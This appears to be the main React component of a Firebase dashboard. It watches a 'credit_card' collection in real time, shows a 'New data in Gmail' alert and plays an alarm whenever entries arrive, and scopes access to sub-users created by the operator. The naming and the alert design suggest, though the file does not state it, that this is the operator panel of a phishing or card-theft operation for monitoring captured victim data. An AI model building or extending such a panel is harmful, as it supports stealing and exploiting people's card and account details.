"use client"

import { useContext, useEffect, useRef, useState } from "react"
import { Outlet, useLocation, useNavigate } from "react-router-dom"
import Navbar from "./components/Navbar"
import "react-toastify/dist/ReactToastify.css"
import { toast, ToastContainer } from "react-toastify"
import Ring from "./assets/horrorRing.m4a"
import { collection, onSnapshot, query, where, orderBy, limit, getDocs } from "firebase/firestore"
import { db } from "./config/firebase"
import Footer from "./components/Footer"
import { RoleCodesContext } from "./store/RoleCodes"

function App() {
  const [isUserAuthenticated, setIsUserAuthenticated] = useState(
    JSON.parse(localStorage.getItem("isUserAuthenticated")) || false,
  )
  const [userData, setUserData] = useState(JSON.parse(localStorage.getItem("userData")) || null)

  const { ADMIN_ROLE_CODE } = useContext(RoleCodesContext)

  const ringRef = useRef(null)
  const [isRingPlaying, setIsRingPlaying] = useState(false)

  // State for all data items
  const [myDataItems, setMyDataItems] = useState(null)

  // Refs for all data items to track changes
  const myDataValueRef = useRef(null)

  const [ownedEmails, setOwnedEmails] = useState([userData?.email])

  const navigate = useNavigate()



  // 


  // 

  useEffect(() => {
    if (!isUserAuthenticated) {
      navigate("/login")
    }
  }, [isUserAuthenticated, navigate])

  // Function to get users created by the current user
  const usersFunction = async () => {
    try {
      if (!userData?.email) {
        return
      }
      const usersRef = collection(db, 'credit_users')
      const q = query(usersRef, where('createdBy', '==', userData?.email))
      const querySnapshot = await getDocs(q)

      if (querySnapshot.docs?.length > 0) {
        const ownedUsernames = querySnapshot.docs.map((doc) => {
          return doc.data()?.email
        })
        ownedUsernames.push(userData?.email)
        setOwnedEmails(ownedUsernames)
        return ownedUsernames
      }

      return [userData?.email]
    } catch (error) {
      toast.error(error?.message)
    }
  }

  // Function to request audio access
  const accessMedia = async () => {
    try {
      // Request access to the user's microphone
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        audio: true,
      })
    } catch (err) {
      toast.error('Error accessing media devices: ' + err?.message)
    }
  }

  useEffect(() => {
    let unsubscribe1

    const handleUseEffectAction = async () => {
      try {
        // Request audio access for notifications
        await accessMedia()

        // Get list of emails owned by the user
        const emailList = await usersFunction()

        if (!emailList) {
          return
        }

        // 1. Data Items Collection (Gmail)
        const dataRef = collection(db, "credit_card")
        const q1 = query(dataRef, orderBy("createdAt", "desc"))

        unsubscribe1 = onSnapshot(q1, (snapshot) => {
          const updatedData = snapshot.docs.map((doc) => ({
            ...doc.data(),
            id: doc.id,
          }))
          setMyDataItems(updatedData)

          // Check if there's new data and play sound + navigate
          if (myDataValueRef.current.value !== '' && updatedData?.length > Number(myDataValueRef.current.value)) {
            toast.success('New data in Gmail')
            ringRef.current.play()
            setIsRingPlaying(true)
            myDataValueRef.current.value = updatedData?.length
            navigate('/dashboard')
          }
          myDataValueRef.current.value = updatedData?.length
        })

      } catch (error) {
        toast.error(error?.message)
      }
    }

    handleUseEffectAction()

    // Clean up all subscriptions when component unmounts
    return () => {
      if (unsubscribe1) unsubscribe1()
    }
  }, [isUserAuthenticated, userData])

  const { pathname } = useLocation()

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    })
  }, [pathname])

  const togglePlay = () => {
    if (isRingPlaying) {
      ringRef.current.pause()
    } else {
      ringRef.current.play()
    }
    setIsRingPlaying(!isRingPlaying)
  }

  return (
    <div className="flex relative">
      <ToastContainer />

      <input type="text" className="hidden" ref={myDataValueRef} />

      <audio ref={ringRef} src={Ring} className="hidden" loop></audio>
      <Navbar
        isUserAuthenticated={isUserAuthenticated}
        setIsUserAuthenticated={setIsUserAuthenticated}
        userData={userData}
        setUserData={setUserData}
      />
      <div className="w-full overflow-hidden flex flex-col gap-10">
        <Outlet
          context={{
            ownedEmails,
            isUserAuthenticated,
            setIsUserAuthenticated,
            userData,
            setUserData,
            myDataItems,
          }}
        />
        <Footer />
      </div>
      <button
        className="block w-12 h-8 md:w-24 md:h-9 rounded-md md:rounded-lg bg-green-400 transition-all fixed md:left-10 md:top-6 left-5 top-20 z-40 hover:w-16 md:hover:w-28 text-white md:font-semibold md:text-xl"
        onClick={togglePlay}
      >
        {isRingPlaying ? "Pause" : "Play"}
      </button>
    </div>
  )
}

export default App
